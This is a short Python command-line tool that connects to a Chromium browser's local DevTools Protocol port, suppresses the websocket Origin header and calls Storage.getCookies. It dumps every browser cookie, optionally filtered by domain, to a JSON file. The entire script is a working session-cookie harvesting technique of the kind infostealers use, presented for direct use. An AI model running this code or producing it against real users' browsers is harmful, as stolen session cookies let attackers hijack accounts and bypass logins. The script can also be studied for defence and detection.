#!/usr/bin/env python3
import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

from websocket import create_connection


def http_json(url: str) -> dict:
    with urllib.request.urlopen(url) as resp:
        return json.loads(resp.read().decode("utf-8"))


def resolve_browser_ws(host: str, port: int) -> str:
    version_url = f"http://{host}:{port}/json/version"
    info = http_json(version_url)
    ws_url = info.get("webSocketDebuggerUrl")
    if not ws_url:
        raise RuntimeError(f"No webSocketDebuggerUrl in {version_url}")
    return ws_url


def cdp_call(ws, message_id: int, method: str, params: dict | None = None) -> dict:
    req = {"id": message_id, "method": method}
    if params:
        req["params"] = params
    ws.send(json.dumps(req))

    while True:
        raw = ws.recv()
        msg = json.loads(raw)
        if msg.get("id") == message_id:
            return msg


def grab_cookies(ws_url: str) -> list[dict]:
    ws = create_connection(ws_url, suppress_origin=True, timeout=10)
    try:
        resp = cdp_call(ws, 1, "Storage.getCookies")
    finally:
        ws.close()

    if "error" in resp:
        raise RuntimeError(f"CDP error: {resp['error']}")
    return resp.get("result", {}).get("cookies", [])


def main() -> int:
    parser = argparse.ArgumentParser(description="Grab cookies over a locally enabled CDP port.")
    parser.add_argument("--host", default="127.0.0.1", help="CDP host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=9001, help="CDP port (default: 9001)")
    parser.add_argument("--output", default="cookies.json", help="Output JSON path")
    parser.add_argument("--domain", help="Optional domain substring filter")
    args = parser.parse_args()

    try:
        ws_url = resolve_browser_ws(args.host, args.port)
        cookies = grab_cookies(ws_url)
    except urllib.error.URLError as exc:
        print(f"[-] Failed to reach CDP endpoint: {exc}", file=sys.stderr)
        return 1
    except Exception as exc:
        print(f"[-] Failed to grab cookies: {exc}", file=sys.stderr)
        return 1

    if args.domain:
        needle = args.domain.lower()
        cookies = [c for c in cookies if needle in c.get("domain", "").lower()]

    with open(args.output, "w", encoding="utf-8") as fh:
        json.dump(cookies, fh, indent=2)

    print(f"[+] Browser websocket: {ws_url}")
    print(f"[+] Cookies written: {len(cookies)}")
    print(f"[+] Output: {args.output}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
